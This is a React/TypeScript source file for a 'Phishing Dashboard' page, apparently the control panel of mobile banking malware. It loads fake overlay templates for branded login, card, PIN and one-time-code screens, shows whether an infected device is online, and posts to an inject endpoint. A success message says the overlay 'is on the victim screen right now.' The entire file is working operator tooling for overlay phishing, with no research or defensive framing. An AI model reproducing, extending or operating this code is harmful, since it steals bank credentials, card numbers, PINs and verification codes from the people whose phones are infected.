import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';
import { Crosshair, Loader2, ShieldAlert } from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { useAuthStore } from '@/store/auth';

interface OverlayPage {
  id: number; slug: string; brand: string; category: string;
  variant: string; title: string; hits: number; enabled: number; url: string;
}

const VARIANT_STYLES: Record<string, string> = {
  login: 'border-primary/20 bg-primary/10 text-primary',
  verify: 'border-violet-500/20 bg-violet-500/10 text-violet-500',
  otp: 'border-amber-500/20 bg-amber-500/10 text-amber-500',
  card: 'border-emerald-500/20 bg-emerald-500/10 text-emerald-500',
  pin: 'border-rose-500/20 bg-rose-500/10 text-rose-500',
};

export default function DevicePhishingPage() {
  const { id } = useParams<{ id: string }>();
  const { hasPermission } = useAuthStore();
  const canInject = hasPermission('phishing:manage');

  const [pages, setPages] = useState<OverlayPage[]>([]);
  const [loading, setLoading] = useState(true);
  const [online, setOnline] = useState<boolean | null>(null);
  const [model, setModel] = useState<string | null>(null);
  const [busy, setBusy] = useState<string | null>(null);
  const [msg, setMsg] = useState<{ ok: boolean; text: string } | null>(null);

  useEffect(() => {
    let alive = true;
    (async () => {
      try {
        const [pRes, dRes] = await Promise.all([
          axios.get('/api/phishing/pages', { params: { pageSize: 500, enabled: '1' } }),
          axios.get(`/api/devices/${id}`),
        ]);
        if (!alive) return;
        setPages((pRes.data?.data?.pages ?? []) as OverlayPage[]);
        const d = dRes.data?.data ?? dRes.data;
        if (d && typeof d === 'object') {
          setOnline(!!(d as { online?: boolean }).online);
          setModel(((d as { deviceModel?: string | null }).deviceModel) ?? null);
        }
      } catch {
        setPages([]);
      } finally {
        if (alive) setLoading(false);
      }
    })();
    return () => { alive = false; };
  }, [id]);

  const inject = async (slug: string) => {
    setBusy(slug);
    setMsg(null);
    try {
      const res = await axios.post('/api/phishing/inject', { deviceId: id, slug });
      if (res.data?.success) {
        setMsg({ ok: true, text: 'Overlay injected — it is on the victim screen right now.' });
      } else {
        setMsg({ ok: false, text: res.data?.error ?? 'Inject failed' });
      }
    } catch {
      setMsg({ ok: false, text: 'Inject failed — device offline?' });
    }
    setBusy(null);
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="flex items-center gap-2 text-xl font-bold">
            <ShieldAlert className="h-5 w-5 text-primary" />
            Phishing Dashboard
          </h2>
          <p className="text-sm text-muted-foreground">
            Device <span className="font-mono text-xs">{id}</span>
            {model ? ` · ${model}` : ''}
            {' · '}
            <span className={online === false ? 'text-destructive' : 'text-emerald-500'}>
              {online === null ? 'status unknown' : online ? 'online' : 'offline'}
            </span>
          </p>
        </div>
      </div>

      {msg && (
        <div className={`text-sm ${msg.ok ? 'text-emerald-500' : 'text-destructive'}`}>{msg.text}</div>
      )}

      {loading ? (
        <Card><CardContent className="flex items-center justify-center gap-2 py-10 text-muted-foreground">
          <Loader2 className="h-4 w-4 animate-spin" /> Loading overlay templates…
        </CardContent></Card>
      ) : pages.length === 0 ? (
        <Card><CardContent className="py-10 text-center text-sm text-muted-foreground">
          No overlay templates. Go to Phishing → Seed pages first.
        </CardContent></Card>
      ) : (
        <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
          {pages.map((p) => (
            <Card key={p.id}>
              <CardHeader className="pb-2">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-sm">{p.brand}</CardTitle>
                  <Badge variant="outline" className={VARIANT_STYLES[p.variant] ?? ''}>{p.variant}</Badge>
                </div>
                <CardDescription className="font-mono text-xs">{p.slug}</CardDescription>
              </CardHeader>
              <CardContent className="flex items-center justify-between">
                <span className="text-xs text-muted-foreground">{p.hits} hits</span>
                <Button
                  size="sm"
                  disabled={!canInject || busy === p.slug || online === false}
                  onClick={() => inject(p.slug)}
                >
                  {busy === p.slug ? <Loader2 className="h-4 w-4 animate-spin" /> : <Crosshair className="h-4 w-4" />}
                  {busy === p.slug ? 'Injecting…' : 'Inject overlay'}
                </Button>
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );
}
